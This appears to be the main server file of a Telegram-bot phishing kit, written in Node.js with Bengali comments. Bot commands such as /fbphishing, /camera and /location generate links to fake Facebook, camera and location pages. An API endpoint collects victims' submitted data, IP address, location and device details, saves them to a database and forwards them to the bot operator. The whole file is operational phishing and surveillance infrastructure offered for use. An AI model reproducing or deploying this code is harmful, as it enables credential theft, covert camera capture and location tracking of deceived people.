require('dotenv').config();
const express = require('express');
const connectDB = require('./config/database');
const setupBot = require('./config/bot');
const NotificationService = require('./utils/notifications');

// এক্সপ্রেস অ্যাপ
const app = express();
app.use(express.json());
app.use(express.static('public'));

// ডাটাবেস কানেক্ট
connectDB();

// বট সেটআপ
const bot = setupBot();
const notifier = new NotificationService(bot);

// কমান্ড ইম্পোর্ট
const startCommand = require('./commands/start');
const fbphishing = require('./commands/fbphishing');
const camera = require('./commands/camera');
const location = require('./commands/location');
const info = require('./commands/info');
const all = require('./commands/all');
const custom = require('./commands/custom');
const shorten = require('./commands/shorten');
const mylinks = require('./commands/mylinks');

// অ্যাডমিন কমান্ড
const users = require('./admin/users');
const userinfo = require('./admin/userinfo');
const ban = require('./admin/ban');
const approve = require('./admin/approve');

// টেলিগ্রাম ওয়েবহুক
app.post('/webhook', (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// কমান্ড হ্যান্ডলার
bot.onText(/\/start/, (msg) => startCommand(bot, msg));
bot.onText(/\/fbphishing/, (msg) => fbphishing(bot, msg));
bot.onText(/\/camera/, (msg) => camera(bot, msg));
bot.onText(/\/location/, (msg) => location(bot, msg));
bot.onText(/\/info/, (msg) => info(bot, msg));
bot.onText(/\/all/, (msg) => all(bot, msg));
bot.onText(/\/custom/, (msg) => custom(bot, msg));
bot.onText(/\/shorten/, (msg) => shorten(bot, msg));
bot.onText(/\/mylinks/, (msg) => mylinks(bot, msg));

// অ্যাডমিন কমান্ড
bot.onText(/\/users/, (msg) => users(bot, msg));
bot.onText(/\/userinfo/, (msg) => userinfo(bot, msg));
bot.onText(/\/ban/, (msg) => ban(bot, msg));
bot.onText(/\/approve/, (msg) => approve(bot, msg));

// ফিশিং পেজ রুট
app.get('/fb/:id', (req, res) => {
  res.sendFile(__dirname + '/public/fb.html');
});

app.get('/camera/:id', (req, res) => {
  res.sendFile(__dirname + '/public/camera.html');
});

app.get('/location/:id', (req, res) => {
  res.sendFile(__dirname + '/public/location.html');
});

app.get('/info/:id', (req, res) => {
  res.sendFile(__dirname + '/public/info.html');
});

app.get('/all/:id', (req, res) => {
  res.sendFile(__dirname + '/public/all.html');
});

app.get('/custom/:id', (req, res) => {
  res.sendFile(__dirname + '/public/custom.html');
});

// ডাটা কালেক্ট API
app.post('/api/data', async (req, res) => {
  try {
    const { linkId, type, data, ip, location, device } = req.body;
    
    const Data = require('./models/Data');
    const Link = require('./models/Link');
    
    // ডাটা সেভ
    const newData = new Data({
      linkId,
      type,
      data,
      ip,
      location,
      device
    });
    
    await newData.save();
    
    // লিংক আপডেট
    await Link.findOneAndUpdate(
      { linkId },
      { $inc: { data: 1 } }
    );
    
    // নোটিফিকেশন পাঠাও
    await notifier.sendDataNotification(linkId, {
      type,
      data,
      ip,
      location,
      device,
      timestamp: new Date()
    });
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('API Error:', error);
    res.status(500).json({ error: error.message });
  }
});

// সার্ভার চালু
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`🌐 Server running on port ${PORT}`);
  console.log(`🤖 Bot is live!`);
});